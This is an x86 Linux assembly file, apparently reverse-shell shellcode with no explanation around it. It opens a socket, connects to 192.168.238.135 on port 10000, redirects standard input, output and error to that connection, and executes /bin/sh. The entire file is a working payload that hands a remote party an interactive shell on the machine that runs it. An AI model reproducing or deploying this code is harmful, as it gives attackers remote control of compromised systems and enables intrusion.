global _start
section .text
_start:
createSocket:
mov ax,359
mov bl,2
mov cl,1
mov dl,0
int 0x80
xor edi,edi
mov edi,eax



createConnect:
xor eax,eax
mov ebx,edi
push eax
push eax
push word 0x87EE ; pushed 238.135
push word 0xA8C0 ; pushed 192.168

push word 0x1027 ;pushed port number htons(10000)
push word 0x2 ; pushed AF_INET
mov ecx, esp
mov dl, 16
mov eax,362
int 0x80
add esp, 16

CloneDescriptors:
xor eax,eax
mov al, 63
mov ebx, edi
xor ecx,ecx
int 0x80

xor eax,eax
mov al, 63
xor ecx,ecx
mov cl, 1
int 0x80

xor eax,eax
mov al, 63
xor ecx,ecx
mov cl, 2
int 0x80

Execve:
xor eax,eax
push eax
mov al,11
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx,ecx
push ecx
push ebx
mov ecx, esp
xor edx,edx
int 0x80

